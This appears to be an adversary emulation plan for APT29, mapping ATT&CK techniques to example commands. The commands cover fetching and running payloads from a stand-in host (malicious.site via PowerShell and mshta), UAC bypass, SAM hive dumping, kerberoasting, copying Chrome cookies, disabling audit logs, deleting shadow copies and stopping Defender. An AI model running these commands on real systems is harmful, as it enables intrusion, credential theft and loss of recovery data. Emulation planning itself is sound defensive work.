
# APT29 Emulation Plan

---

## Initial Access (TA0001)

### T1566.001 - Spearphishing Attachment
- Malicious DOC, PDF, and LNK files  
- Delivered initial malware payloads (e.g., SUNBURST)

### T1566.002 - Spearphishing Link
- Used Constant Contact to send phishing emails  
- Linked to ZIP archives with embedded ISO/VHD files  
- Embedded HTML/JS to drop payloads

### T1195.002 - Supply Chain Compromise
- Trojanized SolarWinds Orion update  
- Delivered SUNBURST backdoor via SUNSPOT build-time injection

### T1078 - Valid Accounts
- Stolen credentials from O365, Exchange, VPNs  
- Reused dormant or inactive user accounts

---

## Execution (TA0002)

### T1059.001 - PowerShell
```
Invoke-WebRequest -Uri http://malicious.site/file.ps1 -OutFile file.ps1  
powershell -ExecutionPolicy Bypass -File file.ps1
```

### T1059.003 - Windows Command Shell
```
cmd.exe /c schtasks /create /tn "WinUpdate" /tr "C:ackdoor.exe" /sc onlogon
```

### T1218.011 - Rundll32
```
rundll32.exe C:\Windows\Temp\malware.dll,EntryPoint
```

### T1218.005 - Mshta
```
mshta http://malicious.site/payload.hta
```

---

## Privilege Escalation (TA0004)

### T1548.002 - Bypass UAC
```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "C:\backdoor.exe"
```

### T1068 - Exploitation for Privilege Escalation
- Exploited CVE-2021-36934 (HiveNightmare)  
- Escalated to SYSTEM via vulnerable permissions

---

## Defense Evasion (TA0005)

### T1027 - Obfuscated Files or Information
- UPX-packed executables  
- Encrypted DLLs using ChaCha20/AES

### T1562.002 - Disable Audit Logs
```
auditpol /set /category:* /success:disable /failure:disable
```

### T1070.004 - File Deletion
```
sdelete.exe -accepteula -nobanner C:\payload.exe
```

### T1070.006 - Timestomp
- Modified timestamps to match system files using custom tools

### T1036.005 - Masquerading
- Renamed malware to appear as system binaries  
- Example: `svchost.exe`, `system32.dll`

---

## Credential Access (TA0006)

### T1003.002 - Security Account Manager
```
reg save HKLM\SAM SAM  
reg save HKLM\SYSTEM SYSTEM
```

### T1555.003 - Credentials from Browsers
- Extracted Chrome saved passwords  
- Accessed Login Data SQLite database

### T1558.003 - Kerberoasting
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

---

## Discovery (TA0007)

### T1087.002 - Account Discovery: Domain Accounts
```
Get-ADUser -Filter *  
Get-ADGroupMember -Identity "Domain Admins"
```

### T1069.002 - Group Membership Discovery
```
AdFind.exe -f "objectcategory=group"
```

### T1018 - Remote System Discovery
```
net view /domain
```

---

## Lateral Movement (TA0008)

### T1021.001 - Remote Desktop Protocol (RDP)
- Lateral movement via RDP with stolen credentials

### T1021.006 - Windows Remote Management (WinRM)
```
Invoke-Command -ComputerName target -ScriptBlock {Invoke-WebRequest ...}
```

### T1550.004 - Cookie Reuse
- Used stolen session cookies to bypass MFA  
- Forged `duo-sid` values for OWA access

---

## Collection (TA0009)

### T1114.002 - Email Collection
```
New-MailboxExportRequest -Mailbox <target> -FilePath \\server\share\export.pst  
Get-MailboxExportRequest
```

### T1005 - Data from Local System
```
copy C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Cookies C:\loot
```

---

## Command and Control (TA0011)

### T1071.001 - Web Protocols (HTTPS)
- SUNBURST and TEARDROP beacons over HTTPS  
- Used DNS, Dropbox, and Twitter for C2

### T1090.004 - Domain Fronting
- Used `meek` plugin over TOR to evade inspection

### T1102.002 - Social Media
- C2 over Twitter handles registered via DGA

---

## Exfiltration (TA0010)

### T1560.001 - Archive Collected Data
```
7z a -p1234 loot.zip C:\loot\*
```

### T1048.002 - Exfil Over HTTPS
- Uploaded encrypted archives to C2 over HTTPS

### T1070.008 - Clear Mailbox Export Logs
```
Remove-MailboxExportRequest -Identity <ExportID>
```

---

## Impact (TA0040)

### T1490 - Inhibit System Recovery
```
vssadmin delete shadows /all /quiet
```

### T1489 - Service Stop
```
sc stop WdNisSvc  
sc stop WinDefend
```

---



